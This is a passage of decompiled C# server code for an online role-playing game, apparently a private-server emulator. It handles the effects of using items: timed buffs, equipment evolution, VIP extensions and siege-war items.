					物品使用(num13, num24, 1);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					计算人物装备数据();
					更新武功和状态();
					break;
				}
				case 1008001339:
				case 1008001340:
				case 1008001341:
				{
					Random random3 = new Random(DateTime.Now.Millisecond);
					switch (random3.Next(1000000408, 1000000415))
					{
					case 1000000408:
					{
						if (追加状态列表.ContainsKey(1000000408))
						{
							追加状态列表[1000000408].时间结束事件();
						}
						if (追加状态列表.ContainsKey(1000000412))
						{
							追加状态列表[1000000412].时间结束事件();
						}
						追加状态类 追加状态类34 = new 追加状态类(this, 900000, 1000000408, 1);
						追加状态列表.Add(追加状态类34.FLD_PID, 追加状态类34);
						状态效果(BitConverter.GetBytes(追加状态类34.FLD_PID), 1, 900000);
						addFLD_追加百分比_攻击(0.1);
						更新武功和状态();
						更新广播人物数据();
						更新人物数据(this);
						break;
					}
					case 1000000409:
					{
						if (追加状态列表.ContainsKey(1000000409))
						{
							追加状态列表[1000000409].时间结束事件();
						}
						追加状态类 追加状态类35 = new 追加状态类(this, 900000, 1000000409, 1);
						追加状态列表.Add(追加状态类35.FLD_PID, 追加状态类35);
						状态效果(BitConverter.GetBytes(追加状态类35.FLD_PID), 1, 900000);
						base.人物追加最大_HP += 500;
						更新HP_MP_SP();
						更新武功和状态();
						更新广播人物数据();
						更新人物数据(this);
						break;
					}
					case 1000000410:
					{
						if (追加状态列表.ContainsKey(1000000410))
						{
							追加状态列表[1000000410].时间结束事件();
						}
						追加状态类 追加状态类37 = new 追加状态类(this, 900000, 1000000410, 1);
						追加状态列表.Add(追加状态类37.FLD_PID, 追加状态类37);
						状态效果(BitConverter.GetBytes(追加状态类37.FLD_PID), 1, 900000);
						base.人物追加最大_MP += 500;
						更新HP_MP_SP();
						更新武功和状态();
						更新广播人物数据();
						更新人物数据(this);
						break;
					}
					case 1000000411:
					{
						if (追加状态列表.ContainsKey(1000000411))
						{
							追加状态列表[1000000411].时间结束事件();
						}
						if (追加状态列表.ContainsKey(1000000413))
						{
							追加状态列表[1000000413].时间结束事件();
						}
						追加状态类 追加状态类38 = new 追加状态类(this, 900000, 1000000411, 1);
						追加状态列表.Add(追加状态类38.FLD_PID, 追加状态类38);
						状态效果(BitConverter.GetBytes(追加状态类38.FLD_PID), 1, 900000);
						addFLD_追加百分比_防御(0.1);
						更新武功和状态();
						更新广播人物数据();
						更新人物数据(this);
						break;
					}
					case 1000000412:
					{
						if (追加状态列表.ContainsKey(1000000412))
						{
							追加状态列表[1000000412].时间结束事件();
						}
						追加状态类 追加状态类40 = new 追加状态类(this, 900000, 1000000412, 1);
						追加状态列表.Add(追加状态类40.FLD_PID, 追加状态类40);
						状态效果(BitConverter.GetBytes(追加状态类40.FLD_PID), 1, 900000);
						addFLD_追加百分比_攻击(0.05);
						更新武功和状态();
						更新广播人物数据();
						更新人物数据(this);
						break;
					}
					case 1000000413:
					{
						if (追加状态列表.ContainsKey(1000000413))
						{
							追加状态列表[1000000413].时间结束事件();
						}
						追加状态类 追加状态类36 = new 追加状态类(this, 900000, 1000000413, 1);
						追加状态列表.Add(追加状态类36.FLD_PID, 追加状态类36);
						状态效果(BitConverter.GetBytes(追加状态类36.FLD_PID), 1, 900000);
						addFLD_追加百分比_防御(0.05);
						更新武功和状态();
						更新广播人物数据();
						更新人物数据(this);
						break;
					}
					case 1000000414:
					{
						if (追加状态列表.ContainsKey(1000000414))
						{
							追加状态列表[1000000414].时间结束事件();
						}
						追加状态类 追加状态类33 = new 追加状态类(this, 900000, 1000000414, 1);
						追加状态列表.Add(追加状态类33.FLD_PID, 追加状态类33);
						状态效果(BitConverter.GetBytes(追加状态类33.FLD_PID), 1, 900000);
						base.FLD_人物_追加百分比_回避 += 0.05;
						更新武功和状态();
						更新广播人物数据();
						更新人物数据(this);
						break;
					}
					}
					物品减去属性数量(num24, 1);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1008001111:
					if (!妖花青草)
					{
						妖花青草 = true;
						追加状态类 追加状态类31 = new 追加状态类(this, 21600000, num49, 1);
						追加状态列表.Add(追加状态类31.FLD_PID, 追加状态类31);
						base.人物追加最大_HP += 500;
						base.人物追加最大_MP += 500;
						base.FLD_人物_追加_经验百分比 += 0.04;
						base.FLD_人物_追加_攻击 += 50;
						base.FLD_人物_追加_防御 += 100;
						base.FLD_人物_武功攻击力增加百分比 += 0.1;
						状态效果(array, 1, 21600000);
						物品减去属性数量(num24, 1);
						更新HP_MP_SP();
						更新武功和状态();
						更新广播人物数据();
						更新人物数据(this);
						更新装备效果();
					}
					break;
				case 1008001112:
					if (!妖花青草)
					{
						妖花青草 = true;
						追加状态类 追加状态类30 = new 追加状态类(this, 21600000, num49, 1);
						追加状态列表.Add(追加状态类30.FLD_PID, 追加状态类30);
						base.人物追加最大_HP += 800;
						base.FLD_人物_追加_回避 += 10;
						base.FLD_人物_追加_武功防御力 += 100.0 / World.武功防御力控制;
						base.FLD_人物_追加_攻击 += 100;
						base.FLD_人物_追加_防御 += 50;
						base.FLD_人物_武功攻击力增加百分比 += 0.1;
						状态效果(array, 1, 21600000);
						物品减去属性数量(num24, 1);
						更新HP_MP_SP();
						更新武功和状态();
						更新广播人物数据();
						更新人物数据(this);
						更新装备效果();
					}
					break;
				case 1008001138:
				{
					int num18 = 得到包裹空位(this);
					if (num18 == -1)
					{
						系统提示("请把背包留一个空位, 不然无法进化！", 10, "系统提示");
						return;
					}
					if (BitConverter.ToInt64(装备栏包裹[0].物品全局ID, 0) == 0)
					{
						系统提示("请把需要进化的防具放到背包第一格", 10, "系统提示");
						return;
					}
					if (装备栏包裹[0].FLD_FJ_进化 == 2)
					{
						系统提示("装备已经是进化2，无需重复进化", 10, "系统提示");
						return;
					}
					if (!World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[0].物品ID, 0), out var value38))
					{
						系统提示("请把需要进化的防具放到背包第一格", 10, "系统提示");
						return;
					}
					if (value38.FLD_RESIDE2 != 1 && value38.FLD_RESIDE2 != 2 && value38.FLD_RESIDE2 != 5 && value38.FLD_RESIDE2 != 6)
					{
						系统提示("不是防具无法进化", 10, "系统提示");
						return;
					}
					if ((double)RNG.Next(1, 100) > World.武器防具进化2成功几率)
					{
						AddItemWithProperties(BitConverter.ToInt32(装备栏包裹[0].物品ID, 0), num18, 1, 装备栏包裹[0].FLD_MAGIC0, 装备栏包裹[0].FLD_MAGIC1, 装备栏包裹[0].FLD_MAGIC2, 装备栏包裹[0].FLD_MAGIC3, 装备栏包裹[0].FLD_MAGIC4, 装备栏包裹[0].FLD_FJ_觉醒, 装备栏包裹[0].FLD_FJ_中级附魂, 2, 0, 0);
						减去物品(0, 1);
						系统提示("恭喜玩家★" + base.UserName + "★使用[真龙宝器[防具]]成功把防具进化v2...！", 10, "系统提示");
					}
					else
					{
						系统提示("很抱歉，进化进化失败。", 50, "系统提示");
					}
					物品使用(num13, num24, 1);
					break;
				}
				case 1008001137:
				{
					int num15 = 得到包裹空位(this);
					if (num15 == -1)
					{
						系统提示("请把背包留一个空位, 不然无法进化！", 10, "系统提示");
						return;
					}
					if (BitConverter.ToInt64(装备栏包裹[0].物品全局ID, 0) == 0)
					{
						系统提示("请把需要进化的武器放到背包第一格", 10, "系统提示");
						return;
					}
					if (装备栏包裹[0].FLD_FJ_进化 == 2)
					{
						系统提示("装备已经是进化2，无需重复进化", 10, "系统提示");
						return;
					}
					if (!World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[0].物品ID, 0), out var value36))
					{
						系统提示("请把需要进化的武器放到背包第一格", 10, "系统提示");
						return;
					}
					if (value36.FLD_RESIDE2 != 4)
					{
						系统提示("不是武器无法进化", 10, "系统提示");
						return;
					}
					if ((double)RNG.Next(1, 100) > World.武器防具进化2成功几率)
					{
						AddItemWithProperties(BitConverter.ToInt32(装备栏包裹[0].物品ID, 0), num15, 1, 装备栏包裹[0].FLD_MAGIC0, 装备栏包裹[0].FLD_MAGIC1, 装备栏包裹[0].FLD_MAGIC2, 装备栏包裹[0].FLD_MAGIC3, 装备栏包裹[0].FLD_MAGIC4, 装备栏包裹[0].FLD_FJ_觉醒, 装备栏包裹[0].FLD_FJ_中级附魂, 2, 0, 0);
						减去物品(0, 1);
						系统提示("恭喜玩家★" + base.UserName + "★使用[真龙宝器[武器]]成功把武器进化v2...！", 10, "系统提示");
					}
					else
					{
						系统提示("很抱歉，进化进化失败。", 50, "系统提示");
					}
					物品使用(num13, num24, 1);
					break;
				}
				case 1008001182:
				case 1008001183:
				case 1008001184:
				case 1008001328:
				{
					int num14 = 3600000;
					switch (num49)
					{
					case 1008001182:
						num14 *= 4;
						break;
					case 1008001183:
						num14 *= 8;
						break;
					case 1008001184:
						num14 *= 24;
						break;
					case 1008001328:
						num14 *= 2;
						break;
					}
					if (追加状态列表.ContainsKey(num49))
					{
						追加状态类 追加状态类15 = 追加状态列表[num49];
						num14 = 追加状态类15.FLD_sj + num14;
						追加状态类15.时间结束事件();
					}
					追加状态类 追加状态类16 = new 追加状态类(this, num14, num49, 1);
					追加状态列表.Add(追加状态类16.FLD_PID, 追加状态类16);
					状态效果(BitConverter.GetBytes(num49), 1, num14);
					更新武功和状态();
					物品使用(num13, num24, 1);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1008001513:
				{
					int num10 = 3600000;
					int num11 = num49;
					int num12 = num11;
					if (num12 == 1008001513)
					{
						num10 *= 24;
					}
					if (追加状态列表.ContainsKey(num49))
					{
						追加状态类 追加状态类12 = 追加状态列表[num49];
						num10 = 追加状态类12.FLD_sj + num10;
						追加状态类12.时间结束事件();
					}
					追加状态类 追加状态类13 = new 追加状态类(this, num10, num49, 1);
					追加状态列表.Add(追加状态类13.FLD_PID, 追加状态类13);
					状态效果(BitConverter.GetBytes(num49), 1, num10);
					更新武功和状态();
					物品使用(num13, num24, 1);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1008002585:
				case 1008002586:
				case 1008002587:
				{
					int num4 = 3600000;
					int num5 = num49;
					int num7 = num5;
					if ((uint)(num7 - 1008002585) <= 2u)
					{
						num4 *= 24;
					}
					if (追加状态列表.ContainsKey(num49))
					{
						追加状态类 追加状态类9 = 追加状态列表[num49];
						num4 = 追加状态类9.FLD_sj + num4;
						追加状态类9.时间结束事件();
					}
					追加状态类 追加状态类10 = new 追加状态类(this, num4, num49, 1);
					追加状态列表.Add(追加状态类10.FLD_PID, 追加状态类10);
					状态效果(BitConverter.GetBytes(num49), 1, num4);
					更新武功和状态();
					物品使用(num13, num24, 1);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1008001187:
					if (!追加状态列表.ContainsKey(1008001187))
					{
						追加状态类 追加状态类8 = new 追加状态类(this, 864000000, num49, 1);
						追加状态列表.Add(追加状态类8.FLD_PID, 追加状态类8);
						base.FLD_人物_追加_经验百分比 += 2.0;
						状态效果(array, 1, 864000000);
						物品使用(num13, num24, 1);
						更新气功();
						更新武功和状态();
						更新人物数据(this);
						更新广播人物数据();
					}
					break;
				case 1008000569:
					if (!追加状态列表.ContainsKey(1008000569))
					{
						追加状态类 追加状态类3 = new 追加状态类(this, 43200000, num49, 1);
						追加状态列表.Add(追加状态类3.FLD_PID, 追加状态类3);
						base.FLD_人物_追加_经验百分比 += 2.0;
						状态效果(array, 1, 43200000);
						物品使用(num13, num24, 1);
						更新气功();
						更新武功和状态();
						更新人物数据(this);
						更新广播人物数据();
					}
					break;
				case 1008001190:
				case 1008001327:
				case 1008001502:
				case 1008001503:
				case 1008001504:
				{
					int num3 = 3600000;
					switch (num49)
					{
					case 1008001190:
					case 1008001327:
						num3 *= 2;
						break;
					case 1008001502:
						num3 *= 4;
						break;
					case 1008001503:
						num3 *= 8;
						break;
					case 1008001504:
						num3 *= 24;
						break;
					}
					if (追加状态列表.ContainsKey(num49))
					{
						追加状态类 追加状态类63 = 追加状态列表[num49];
						num3 = 追加状态类63.FLD_sj + num3;
						追加状态类63.时间结束事件();
					}
					追加状态类 追加状态类74 = new 追加状态类(this, num3, num49, 1);
					追加状态列表.Add(追加状态类74.FLD_PID, 追加状态类74);
					状态效果(BitConverter.GetBytes(num49), 1, num3);
					更新武功和状态();
					物品使用(num13, num24, 1);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1008001331:
					天云岳美容效果(num49);
					物品使用(num13, num24, 1);
					break;
				case 1008001332:
					天云岳整容效果(num49);
					物品使用(num13, num24, 1);
					break;
				case 1008001390:
					if (装备栏包裹[num24].FLD_MAGIC0 < 装备栏包裹[num24].FLD_MAGIC1)
					{
						if (凝神宝珠位置 != -1)
						{
							精神宝珠包(2, 0.0);
							凝神宝珠位置 = -1;
						}
						else
						{
							凝神宝珠位置 = num24;
							精神宝珠包(1, 0.0);
						}
					}
					else
					{
						物品使用(num13, num24, 1);
						base.人物经验 += 装备栏包裹[num24].FLD_MAGIC0;
						计算人物基本数据3();
						更新经验和历练();
						更新金钱和负重();
					}
					break;
				case 1008001391:
					if (装备栏包裹[num24].FLD_MAGIC0 < 装备栏包裹[num24].FLD_MAGIC1)
					{
						if (凝神宝珠位置 != -1)
						{
							精神宝珠包(2, 0.0);
							凝神宝珠位置 = -1;
						}
						else
						{
							凝神宝珠位置 = num24;
							精神宝珠包(1, 0.0);
						}
					}
					else
					{
						物品使用(num13, num24, 1);
						base.人物经验 += 装备栏包裹[num24].FLD_MAGIC0;
						计算人物基本数据3();
						更新经验和历练();
						更新金钱和负重();
					}
					break;
				case 1008001392:
					if (装备栏包裹[num24].FLD_MAGIC0 < 装备栏包裹[num24].FLD_MAGIC1)
					{
						if (凝神宝珠位置 != -1)
						{
							精神宝珠包(2, 0.0);
							凝神宝珠位置 = -1;
						}
						else
						{
							凝神宝珠位置 = num24;
							精神宝珠包(1, 0.0);
						}
					}
					else
					{
						物品使用(num13, num24, 1);
						base.人物经验 += 装备栏包裹[num24].FLD_MAGIC0;
						计算人物基本数据3();
						更新经验和历练();
						更新金钱和负重();
					}
					break;
				case 1008001940:
				{
					bool flag = false;
					int i;
					for (i = 0; i < 96; i++)
					{
						if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == 1000001150)
						{
							flag = true;
							break;
						}
					}
					if (!flag)
					{
						return;
					}
					Random random7 = new Random(World.GetRandomSeed());
					int 物品ID3 = random7.Next(1000001170, 1000001176);
					BitConverter.GetBytes(RxjhClass.GetDBItmeId());
					int num98 = 得到包裹空位(this);
					if (num98 != -1)
					{
						AddItemWithProperties(物品ID3, num98, 1, 190000000, 220000000, 0, 0, 0, 0, 0, 0, 0, 0);
						物品使用(num13, num24, 1);
						减去物品(i, 1);
						if (特殊药品.ContainsKey(1000001150))
						{
							特殊药品.TryRemove(1000001150, out var _);
							药品新效果(1000001150, 0, 0u, 0u);
						}
					}
					else
					{
						系统提示("背包没有空位请清理一下.", 50, "");
					}
					return;
				}
				case 1000001150:
				{
					byte[] array10 = new byte[4];
					Buffer.BlockCopy(装备栏包裹[num24].物品_byte, 32, array10, 0, 4);
					int num94 = BitConverter.ToInt32(array10, 0);
					if (num94 >= 0)
					{
						DateTime dateTime = new DateTime(1970, 1, 1, 8, 0, 0);
						if (DateTime.Now.Subtract(dateTime.AddSeconds(num94)).TotalSeconds >= 0.0)
						{
							Random random6 = new Random(World.GetRandomSeed());
							int value24 = random6.Next(1000001170, 1000001176);
							byte[] bytes2 = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
							int num95 = 得到包裹空位(this);
							if (num95 != -1)
							{
								增加物品(bytes2, BitConverter.GetBytes(value24), num95, BitConverter.GetBytes(1), new byte[56]);
								物品使用(num13, num24, 1);
							}
							else
							{
								系统提示("背包没有空位请清理一下.", 50, "");
							}
						}
						else
						{
							string hex = "AA551200E2007B030C00000000008E2700000000000055AA";
							byte[] array11 = Converter.hexStringToByte(hex);
							Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array11, 4, 2);
							if (base.Client != null)
							{
								base.Client.Send多包(array11, array11.Length);
							}
							物品使用(num13, num24, 0);
						}
					}
					else
					{
						string hex2 = "AA551200E2007B030C00000000008E2700000000000055AA";
						byte[] array12 = Converter.hexStringToByte(hex2);
						Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array12, 4, 2);
						if (base.Client != null)
						{
							base.Client.Send多包(array12, array12.Length);
						}
						物品使用(num13, num24, 0);
					}
					return;
				}
				case 1008001478:
				{
					if (称号药品.TryGetValue(1008001479, out var value21) || (称号药品.TryGetValue(1008001478, out value21) ? true : false))
					{
						新吃药提示();
						return;
					}
					物品使用(num13, num24, 1);
					DateTime d4 = DateTime.Now.AddDays(30.0);
					DateTime now4 = DateTime.Now;
					double num91 = Convert.ToDouble(d4.ToString("yyMMddHHmm"));
					TimeSpan timeSpan5 = d4 - now4;
					称号药品类 称号药品类2 = new 称号药品类();
					称号药品类2.药品ID = 1008001478;
					称号药品类2.时间 = (uint)num91;
					称号药品类 称号药品类5 = 称号药品类2;
					称号药品.TryAdd(称号药品类5.药品ID, 称号药品类5);
					药品新效果(1008001478, 1, 称号药品类5.时间, (uint)timeSpan5.TotalMinutes);
					药品追加对怪攻击 = 150;
					药品追加对怪防御 = 200;
					FLD_药品_追加_气功 = 2;
					Config.武勋开关 = 90;
					RxjhClass.药品记录(base.Userid, base.UserName, 1008001478, "激活斗神称号", 1);
					break;
				}
				case 1008001498:
					if (base.Player_WuXun < 0)
					{
						物品减去属性数量(num24, 1);
						base.Player_WuXun += 100;
						if (base.Player_WuXun > 0)
						{
							base.Player_WuXun = 0;
						}
						更新武功和状态();
					}
					else
					{
						系统提示("只有武勋为负数的时候才能使用。");
					}
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					return;
				case 1008001499:
					if (base.Player_WuXun < 0)
					{
						物品使用(num13, num24, 1);
						base.Player_WuXun += 500;
						if (base.Player_WuXun > 0)
						{
							base.Player_WuXun = 0;
						}
						更新武功和状态();
					}
					else
					{
						系统提示("只有武勋为负数的时候才能使用。");
					}
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					return;
				case 1008001500:
					if (base.Player_WuXun < 0)
					{
						物品减去属性数量(num24, 1);
						base.Player_WuXun += 1000;
						if (base.Player_WuXun > 0)
						{
							base.Player_WuXun = 0;
						}
						更新武功和状态();
					}
					else
					{
						系统提示("只有武勋为负数的时候才能使用。");
					}
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					return;
				case 1008001501:
					物品使用(num13, num24, 1);
					if (base.FLD_VIP != 0)
					{
						base.FLD_VIPTIM = base.FLD_VIPTIM.AddDays(10.0);
					}
					else
					{
						base.FLD_VIP = 1;
						base.FLD_VIPTIM = DateTime.Now.AddDays(10.0);
					}
					系统提示("您的VIP到期时间为:" + base.FLD_VIPTIM.ToString());
					保存会员数据();
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					return;
				case 1008001583:
					物品使用(num13, num24, 1);
					if (base.FLD_VIP != 0)
					{
						base.FLD_VIPTIM = base.FLD_VIPTIM.AddDays(10.0);
					}
					else
					{
						base.FLD_VIP = 1;
						base.FLD_VIPTIM = DateTime.Now.AddDays(10.0);
					}
					系统提示("您的VIP到期时间为:" + base.FLD_VIPTIM.ToString());
					保存会员数据();
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					return;
				case 1008001584:
					物品使用(num13, num24, 1);
					if (base.FLD_VIP != 0)
					{
						base.FLD_VIPTIM = base.FLD_VIPTIM.AddDays(30.0);
					}
					else
					{
						base.FLD_VIP = 1;
						base.FLD_VIPTIM = DateTime.Now.AddDays(30.0);
					}
					系统提示("您的VIP到期时间为:" + base.FLD_VIPTIM.ToString());
					保存会员数据();
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					return;
				case 1008000203:
					物品使用(num13, num24, 1);
					if (base.FLD_QCVIP != 0)
					{
						base.FLD_QCVIPTIM = base.FLD_QCVIPTIM.AddDays(1.0);
					}
					else
					{
						base.FLD_QCVIP = 1;
						base.FLD_QCVIPTIM = DateTime.Now.AddDays(1.0);
					}
					系统提示("您的八彩VIP到期时间为:" + base.FLD_QCVIPTIM.ToString());
					保存八彩数据();
					break;
				case 1008000210:
					物品使用(num13, num24, 1);
					if (base.FLD_QCVIP != 0)
					{
						base.FLD_QCVIPTIM = base.FLD_QCVIPTIM.AddDays(30.0);
					}
					else
					{
						base.FLD_QCVIP = 1;
						base.FLD_QCVIPTIM = DateTime.Now.AddDays(30.0);
					}
					系统提示("您的八彩VIP到期时间为:" + base.FLD_QCVIPTIM.ToString());
					保存八彩数据();
					break;
				case 1008000142:
				{
					if (特殊药品.ContainsKey(1008000142))
					{
						新吃药提示();
						break;
					}
					DateTime d3 = DateTime.Now.AddDays(365.0);
					DateTime now3 = DateTime.Now;
					uint 时间6 = Convert.ToUInt32(d3.ToString("yyMMddHHmm"));
					TimeSpan timeSpan4 = d3 - now3;
					特殊药品类 特殊药品类2 = new 特殊药品类();
					特殊药品类2.时间 = 时间6;
					特殊药品类 特殊药品类3 = 特殊药品类2;
					特殊药品类 特殊药品类4 = 特殊药品类3;
					特殊药品类4.药品ID = 1008000142;
					药品新效果(1008000142, 1, 特殊药品类4.时间, (uint)timeSpan4.TotalMinutes);
					特殊药品.TryAdd(特殊药品类4.药品ID, 特殊药品类4);
					set特殊物品(特殊药品类4);
					物品使用(num13, num24, 1);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1008001994:
				{
					if (时间药品.ContainsKey(1008001993) || 时间药品.ContainsKey(1008001994))
					{
						return;
					}
					DateTime d2 = DateTime.Now.AddDays(30.0);
					DateTime now2 = DateTime.Now;
					uint 时间5 = Convert.ToUInt32(d2.ToString("yyMMddHHmm"));
					TimeSpan timeSpan3 = d2 - now2;
					时间药品类 时间药品类2 = new 时间药品类();
					时间药品类2.时间 = 时间5;
					时间药品类 时间药品类8 = 时间药品类2;
					时间药品类 时间药品类9 = 时间药品类8;
					时间药品类9.药品ID = 1008001994;
					萌犬表情效果(1008001994, 1, 时间药品类9.时间, (uint)timeSpan3.TotalMinutes);
					药品新效果(1008001994, 1, 时间药品类9.时间, (uint)timeSpan3.TotalMinutes);
					时间药品.TryAdd(时间药品类9.药品ID, 时间药品类9);
					物品使用(num13, num24, 1);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1008001993:
				{
					if (时间药品.ContainsKey(1008001993) || 时间药品.ContainsKey(1008001994))
					{
						return;
					}
					DateTime d = DateTime.Now.AddDays(7.0);
					DateTime now = DateTime.Now;
					uint 时间4 = Convert.ToUInt32(d.ToString("yyMMddHHmm"));
					TimeSpan timeSpan2 = d - now;
					时间药品类 时间药品类4 = new 时间药品类();
					时间药品类4.时间 = 时间4;
					时间药品类 时间药品类6 = 时间药品类4;
					时间药品类 时间药品类7 = 时间药品类6;
					时间药品类7.药品ID = 1008001993;
					萌犬表情效果(1008001993, 1, 时间药品类7.时间, (uint)timeSpan2.TotalMinutes);
					药品新效果(1008001993, 1, 时间药品类7.时间, (uint)timeSpan2.TotalMinutes);
					时间药品.TryAdd(时间药品类7.药品ID, 时间药品类7);
					物品使用(num13, num24, 1);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1008002185:
				{
					if (base.人物坐标_地图 != 42001)
					{
						新使用物品提示发送(num24, 1008002185, 10246, 1, num36);
						break;
					}
					if (base.帮派名字 == World.天魔神宫占领者)
					{
						发送提示文本("你是猴子请来的逗逼吧？守城人员不能攻击城门和守城雕像！");
						break;
					}
					if (World.攻城战进程 != 3)
					{
						新使用物品提示发送(num24, 1008002185, 10237, 1, num36);
						break;
					}
					if (num36 < 10000)
					{
						新使用物品提示发送(num24, 1008002185, 10258, 1, num36);
						break;
					}
					NpcClass npc4 = MapClass.GetNpc(base.人物坐标_地图, num36);
					if (npc4 == null)
					{
						新使用物品提示发送(num24, 1008002185, 10258, 1, num36);
						break;
					}
					if (npc4.FLD_PID != 16430 && npc4.FLD_PID != 16431)
					{
						新使用物品提示发送(num24, 1008002185, 10258, 1, num36);
						break;
					}
					if (!npc4.玩家是否在指定范围内(100, this))
					{
						发送提示文本("距离太远，无法使用");
						break;
					}
					物品使用(1, num24, 1);
					更新金钱和负重();
					npc4.Rxjh_HP -= 100000;
					npc4.发送怪物当前血量();
					if ((long)npc4.Rxjh_HP <= 0L)
					{
						npc4.发送死亡数据(base.人物全服ID);
					}
					break;
				}
				case 1008002187:
					if (base.人物坐标_地图 != 42001)
					{
						新使用物品提示发送(num24, 1008002187, 10246, 1, num36);
					}
					else if (World.攻城战进程 != 3)
					{
						新使用物品提示发送(num24, 1008002187, 10237, 1, num36);
					}
					else
					{
						if (World.SiegeWar == null)
						{
							break;
						}
						if (base.帮派名字 == World.天魔神宫占领者)
						{
							发送提示文本("你是猴子请来的逗逼吧？守城人员不能攻击城门和守城雕像！");
							break;
						}
						if (num36 < 10000)
						{
							新使用物品提示发送(num24, 1008002187, 10258, 1, num36);
							break;
						}
						NpcClass npc3 = MapClass.GetNpc(base.人物坐标_地图, num36);
						if (npc3 == null)
						{
							新使用物品提示发送(num24, 1008002187, 10258, 1, num36);
							break;
						}
						if (npc3.FLD_PID != 16430 && npc3.FLD_PID != 16431)
						{
							新使用物品提示发送(num24, 1008002187, 10258, 1, num36);
							break;
						}
						if (!npc3.玩家是否在指定范围内(100, this))
						{
							发送提示文本("距离太远，无法使用");
							break;
						}
						物品使用(1, num24, 1);
						更新金钱和负重();
						npc3.Rxjh_HP -= 400000;
						npc3.发送怪物当前血量();
						if ((long)npc3.Rxjh_HP <= 0L)
						{
							npc3.发送死亡数据(base.人物全服ID);
						}
					}
					break;
				case 1008002191:
				{
					if (base.人物坐标_地图 != 42001)
					{
						新使用物品提示发送(282, 1008002191, 10246, 1, num36);
						break;
					}
					if (World.攻城战进程 != 3)
					{
						新使用物品提示发送(num24, 1008002191, 10237, 1, num36);
						break;
					}
					if (base.门派联盟盟主 == base.帮派名字 && base.帮派人物等级 == 6)
					{
						发送提示文本("盟主不能使用");
						break;
					}
					Players players15 = 取联盟盟主();
					if (players15 == null)
					{
						break;
					}
					if (玩家是否在指定范围内(400, players15))
					{
						if (!players15.追加状态列表.ContainsKey(1008002191))
						{
							追加状态类 追加状态类70 = new 追加状态类(players15, 60000, num13, 0);
							players15.追加状态列表.Add(追加状态类70.FLD_PID, 追加状态类70);
							发送攻城相关BUFF(players15, 1008002191, DateTime.Now.AddSeconds(60.0), 是否消失: false);
							追加状态类70 = new 追加状态类(this, 60000, 1008002191, 0);
							追加状态列表.Add(追加状态类70.FLD_PID, 追加状态类70);
							发送攻城相关BUFF(this, 1008002191, DateTime.Now.AddSeconds(60.0), 是否消失: false);
							物品使用(1, num24, 1);
							更新金钱和负重();
						}
					}
					else
					{
						发送提示文本("距离太远，无法使用");
					}
					break;
				}
				case 1008002192:
				{
					int num52 = 60;
					if (base.人物坐标_地图 != 42001)
					{
						新使用物品提示发送(282, 1008002192, 10246, 1, num36);
						break;
					}
					if (World.攻城战进程 != 3)
					{
						新使用物品提示发送(num24, 1008002192, 10237, 1, num36);
						break;
					}
					if (追加状态列表.ContainsKey(1008002192))
					{
						新使用物品提示发送(num24, 1008002192, 10243, 1, num36);
						return;
					}
					追加状态类 追加状态类68 = new 追加状态类(this, num52 * 1000, 1008002192, 0);
					追加状态列表.Add(追加状态类68.FLD_PID, 追加状态类68);
					发送攻城相关BUFF(this, 1008002192, DateTime.Now.AddSeconds(num52), 是否消失: false);
					物品使用(1, num24, 1);
					更新金钱和负重();
					向周围玩家发送我的攻城中图标();
					break;
				}
				case 1008002193:
				{
					if (base.人物坐标_地图 != 42001)
					{
						新使用物品提示发送(282, 1008002193, 10246, 1, num36);
						break;
					}
					if (World.攻城战进程 != 3)
					{
						新使用物品提示发送(num24, 1008002193, 10237, 1, num36);
						break;
					}
					List<Players> list2 = 获取范围玩家(300);
					foreach (Players item in list2)
					{
						if (item.门派联盟盟主 != base.门派联盟盟主 && item.追加状态列表.ContainsKey(1008002192))
						{
							item.追加状态列表[1008002192].时间结束事件();
							item.向周围玩家发送我的攻城中图标();
						}
					}
					物品使用(1, num24, 1);
					更新金钱和负重();
					break;
				}
				case 1008002194:
				{
					if (base.人物坐标_地图 != 42001)
					{
						新使用物品提示发送(num24, 1008002194, 10246, 1, num36);
						break;
					}
					if (World.攻城战进程 != 3)
					{
						新使用物品提示发送(num24, 1008002194, 10237, 1, num36);
						break;
					}
					if (base.帮派名字 == World.天魔神宫占领者)
					{
						发送提示文本("你是猴子请来的逗逼吧？守城人员不能攻击城门和守城雕像！");
						break;
					}
					if (World.SiegeWar.火龙之力释放 && (base.帮派人物等级 != 6 || !(base.帮派名字 == base.门派联盟盟主)))
					{
						发送提示文本("只有攻城队长才能攻击拥有火龙之力的守城雕像!");
						break;
					}
					if (num36 < 10000)
					{
						新使用物品提示发送(num24, 1008002194, 10258, 1, num36);
						break;
					}
					NpcClass npc2 = MapClass.GetNpc(base.人物坐标_地图, num36);
					if (npc2 == null)
					{
						新使用物品提示发送(num24, 1008002194, 10258, 1, num36);
						break;
					}
					if (npc2.FLD_PID != 16430 && npc2.FLD_PID != 16431 && npc2.FLD_PID != 16435)
					{
						新使用物品提示发送(num24, 1008002194, 10258, 1, num36);
						break;
					}
